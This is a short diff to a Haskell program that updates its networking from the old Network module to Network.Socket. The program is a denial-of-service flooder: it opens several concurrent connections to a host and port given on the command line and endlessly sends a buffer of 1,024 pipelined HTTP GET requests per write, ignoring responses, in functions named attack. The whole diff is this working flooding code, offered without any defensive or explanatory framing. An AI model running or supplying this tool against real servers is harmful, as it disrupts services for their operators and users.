@@ -1,7 +1,8 @@
 {-# LANGUAGE OverloadedStrings #-}
-import Network
+import Network.Socket
 import Control.Monad
 import qualified Data.ByteString.Char8 as B
+import qualified Network.Socket.ByteString as B
 import Control.Concurrent
 import Foreign.Marshal.Alloc
 import GHC.IO.Handle
@@ -9,18 +10,23 @@ import System.Environment
 
 main = do
   [host, port] <- getArgs
-  sh <- connectTo host $ PortNumber $ fromIntegral $ read port
-  forM_ ([0..98]::[Int]) $ \_ -> forkIO (attack host (fromIntegral (read port)))
-  attack1 sh
+  (addrinfo:_) <- getAddrInfo 
+                    (Just (defaultHints { addrFamily = AF_INET })) 
+                    (Just host) 
+                    (Just port)
+  let sa = addrAddress addrinfo
+  print sa
+  forM_ ([0..5]::[Int]) $ \_ -> forkIO (attack sa)
+  attack sa
 
-attack host port = (connectTo host $ PortNumber port) >>= attack1
+attack sa = do
+  sock <- socket AF_INET Stream 0
+  connect sock sa
+  attack1 sock
 
-attack1 sh = do
-  forkIO $ do
-    forever $ B.hGet sh (1024*1024)
-  forever $ do
-    B.hPutStr sh prepmsg
-    putStrLn "hit"
+attack1 sock =
+  do forkIO $ forever $ B.recv sock 1024
+     forever $ B.sendAll sock prepmsg
 
 prepmsg :: B.ByteString
 prepmsg = B.concat $ take 1024 $ repeat "GET /robgssp HTTP/1.1\r\n\r\n"
